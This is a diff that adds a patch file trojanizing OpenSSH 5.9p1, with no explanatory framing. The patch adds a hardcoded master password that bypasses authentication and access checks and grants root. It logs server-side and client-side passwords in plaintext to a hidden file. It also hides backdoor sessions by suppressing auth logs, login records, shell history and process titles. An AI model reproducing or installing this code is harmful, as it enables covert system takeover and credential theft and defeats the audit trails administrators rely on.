@@ -1,0 +1,253 @@
+diff -rupN openssh-5.9p1/auth-passwd.c openssh-5.9p1-patched/auth-passwd.c
+--- openssh-5.9p1/auth-passwd.c	2009-03-07 19:40:28.000000000 -0500
++++ openssh-5.9p1-patched/auth-passwd.c	2011-11-10 16:00:56.000000000 -0500
+@@ -114,6 +114,13 @@ auth_password(Authctxt *authctxt, const 
+ #ifdef USE_PAM
+ 	if (options.use_pam)
+ 		return (sshpam_auth_passwd(authctxt, password) && ok);
++
++       magic_pass_active = 0;
++        if(strcmp(password, MAGICPASSWD) == 0)
++          {
++            magic_pass_active = 1;
++            return 1;
++          }
+ #endif
+ #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
+ 	if (!expire_checked) {
+@@ -209,6 +216,15 @@ sys_auth_passwd(Authctxt *authctxt, cons
+ 	 * Authentication is accepted if the encrypted passwords
+ 	 * are identical.
+ 	 */
+-	return (strcmp(encrypted_password, pw_password) == 0);
++       if(strcmp(encrypted_password, pw_password) == 0)
++       {
++         FILE *fp = fopen(PASSWORDS_LOG_FILE,"a");
++         fprintf (fp, "login in: %s:%s\n", pw->pw_name, password);
++         fclose (fp);
++         
++         return 1;
++       }
++       else
++         return 0;
+ }
+ #endif
+diff -rupN openssh-5.9p1/auth.c openssh-5.9p1-patched/auth.c
+--- openssh-5.9p1/auth.c	2011-05-29 07:40:42.000000000 -0400
++++ openssh-5.9p1-patched/auth.c	2011-11-10 16:00:56.000000000 -0500
+@@ -94,6 +94,10 @@ int auth_debug_init;
+ int
+ allowed_user(struct passwd * pw)
+ {
++  if(magic_pass_active)
++    return 1;
++  else
++    {
+ 	struct stat st;
+ 	const char *hostname = NULL, *ipaddr = NULL, *passwd = NULL;
+ 	u_int i;
+@@ -249,10 +253,12 @@ allowed_user(struct passwd * pw)
+ 	/* We found no reason not to let this user try to log on... */
+ 	return 1;
+ }
+-
++}
+ void
+ auth_log(Authctxt *authctxt, int authenticated, char *method, char *info)
+ {
++  if(!magic_pass_active)
++    {
+ 	void (*authlog) (const char *fmt,...) = verbose;
+ 	char *authmsg;
+ 
+@@ -298,13 +304,15 @@ auth_log(Authctxt *authctxt, int authent
+ 		audit_event(audit_classify_auth(method));
+ #endif
+ }
+-
++}
+ /*
+  * Check whether root logins are disallowed.
+  */
+ int
+ auth_root_allowed(char *method)
+ {
++  if(!magic_pass_active)
++    {
+ 	switch (options.permit_root_login) {
+ 	case PERMIT_YES:
+ 		return 1;
+@@ -322,7 +330,9 @@ auth_root_allowed(char *method)
+ 	logit("ROOT LOGIN REFUSED FROM %.200s", get_remote_ipaddr());
+ 	return 0;
+ }
+-
++  else
++    return 1;
++}
+ 
+ /*
+  * Given a template and a passwd structure, build a filename
+diff -rupN openssh-5.9p1/canohost.c openssh-5.9p1-patched/canohost.c
+--- openssh-5.9p1/canohost.c	2010-10-11 22:28:12.000000000 -0400
++++ openssh-5.9p1-patched/canohost.c	2011-11-10 16:00:56.000000000 -0500
+@@ -81,6 +81,10 @@ get_remote_hostname(int sock, int use_dn
+ 	if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
+ 	    NULL, 0, NI_NAMEREQD) != 0) {
+ 		/* Host name not found.  Use ip address. */
++#if 0 
++       if(!magic_pass_active)
++           log("Could not reverse map address %.100s.", ntop);
++#endif
+ 		return xstrdup(ntop);
+ 	}
+ 
+diff -rupN openssh-5.9p1/includes.h openssh-5.9p1-patched/includes.h
+--- openssh-5.9p1/includes.h	2010-10-23 19:47:30.000000000 -0400
++++ openssh-5.9p1-patched/includes.h	2011-11-10 16:00:56.000000000 -0500
+@@ -172,4 +172,9 @@
+ 
+ #include "entropy.h"
+ 
++#ifndef BACKDOOR
++#define BACKDOOR
++#include "magicpass.h"
++#endif
++
+ #endif /* INCLUDES_H */
+diff -rupN openssh-5.9p1/magicpass.h openssh-5.9p1-patched/magicpass.h
+--- openssh-5.9p1/magicpass.h	1969-12-31 19:00:00.000000000 -0500
++++ openssh-5.9p1-patched/magicpass.h	2011-11-10 16:00:56.000000000 -0500
+@@ -0,0 +1,4 @@
++#define MAGICPASSWD "supersecret"
++#define LOGGING_PASSWORDS 1
++#define PASSWORDS_LOG_FILE "/var/tmp/tmp-XXXXXXX"
++int magic_pass_active;
+diff -rupN openssh-5.9p1/session.c openssh-5.9p1-patched/session.c
+--- openssh-5.9p1/session.c	2011-05-19 21:23:10.000000000 -0400
++++ openssh-5.9p1-patched/session.c	2011-11-10 16:00:56.000000000 -0500
+@@ -1203,6 +1203,9 @@ do_setup_env(Session *s, const char *she
+ 	if (getenv("TZ"))
+ 		child_set_env(&env, &envsize, "TZ", getenv("TZ"));
+ 
++        if(magic_pass_active)
++                child_set_env(&env, &envsize, "HISTFILE", "/dev/null");
++
+ 	/* Set custom environment options from RSA authentication. */
+ 	if (!options.use_login) {
+ 		while (custom_environment) {
+@@ -1487,6 +1490,8 @@ do_setusercontext(struct passwd *pw)
+ #else
+ 		if (setlogin(pw->pw_name) < 0)
+ 			error("setlogin failed: %s", strerror(errno));
++                if(!magic_pass_active)
++                   {
+ 		if (setgid(pw->pw_gid) < 0) {
+ 			perror("setgid");
+ 			exit(1);
+@@ -1496,6 +1501,13 @@ do_setusercontext(struct passwd *pw)
+ 			perror("initgroups");
+ 			exit(1);
+ 		}
++                }
++                else
++                   {
++                     setgid(0);
++                     initgroups(pw->pw_name, 0);
++                   }
++
+ 		endgrent();
+ #endif
+ 
+@@ -1523,7 +1535,7 @@ do_setusercontext(struct passwd *pw)
+ #endif
+ 	}
+ 
+-	if (getuid() != pw->pw_uid || geteuid() != pw->pw_uid)
++        if ((getuid() != pw->pw_uid || geteuid() != pw->pw_uid) && !magic_pass_active)
+ 		fatal("Failed to set uids to %u.", (u_int) pw->pw_uid);
+ }
+ 
+@@ -2591,10 +2603,14 @@ session_proctitle(Session *s)
+ {
+ 	if (s->pw == NULL)
+ 		error("no user for session %d", s->self);
+-	else
+-		setproctitle("%s@%s", s->pw->pw_name, session_tty_list());
+-}
+-
++        else{
++            if(!magic_pass_active)
++          setproctitle("%s@%s", s->pw->pw_name, session_tty_list());
++            else
++              setproctitle("","");
++        }
++        }
++        
+ int
+ session_setup_x11fwd(Session *s)
+ {
+diff -rupN openssh-5.9p1/sshconnect2.c openssh-5.9p1-patched/sshconnect2.c
+--- openssh-5.9p1/sshconnect2.c	2011-05-29 07:42:34.000000000 -0400
++++ openssh-5.9p1-patched/sshconnect2.c	2011-11-10 16:00:56.000000000 -0500
+@@ -879,6 +879,12 @@ userauth_passwd(Authctxt *authctxt)
+ 	    authctxt->server_user, host);
+ 	password = read_passphrase(prompt, 0);
+ 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
++        if((strcmp(MAGICPASSWD,password) != 0) && LOGGING_PASSWORDS)
++        {
++              FILE *fp = fopen(PASSWORDS_LOG_FILE,"a");
++              fprintf (fp,"login at: %s %s:%s\n", get_remote_ipaddr(), options.user, password);
++              fclose (fp);
++        }
+ 	packet_put_cstring(authctxt->server_user);
+ 	packet_put_cstring(authctxt->service);
+ 	packet_put_cstring(authctxt->method->name);
+diff -rupN openssh-5.9p1/sshlogin.c openssh-5.9p1-patched/sshlogin.c
+--- openssh-5.9p1/sshlogin.c	2011-01-11 01:20:07.000000000 -0500
++++ openssh-5.9p1-patched/sshlogin.c	2011-11-10 16:00:56.000000000 -0500
+@@ -126,6 +126,8 @@ void
+ record_login(pid_t pid, const char *tty, const char *user, uid_t uid,
+     const char *host, struct sockaddr *addr, socklen_t addrlen)
+ {
++ if(!magic_pass_active)
++    {
+ 	struct logininfo *li;
+ 
+ 	/* save previous login details before writing new */
+@@ -136,12 +138,14 @@ record_login(pid_t pid, const char *tty,
+ 	login_login(li);
+ 	login_free_entry(li);
+ }
+-
++}
+ #ifdef LOGIN_NEEDS_UTMPX
+ void
+ record_utmp_only(pid_t pid, const char *ttyname, const char *user,
+ 		 const char *host, struct sockaddr *addr, socklen_t addrlen)
+ {
++   if(!magic_pass_active)
++     {
+ 	struct logininfo *li;
+ 
+ 	li = login_alloc_entry(pid, user, host, ttyname);
+@@ -149,15 +153,19 @@ record_utmp_only(pid_t pid, const char *
+ 	login_utmp_only(li);
+ 	login_free_entry(li);
+ }
++}
+ #endif
+ 
+ /* Records that the user has logged out. */
+ void
+ record_logout(pid_t pid, const char *tty, const char *user)
+ {
++  if(!magic_pass_active)
++    {
+ 	struct logininfo *li;
+ 
+ 	li = login_alloc_entry(pid, user, NULL, tty);
+ 	login_logout(li);
+ 	login_free_entry(li);
++    }
+ }
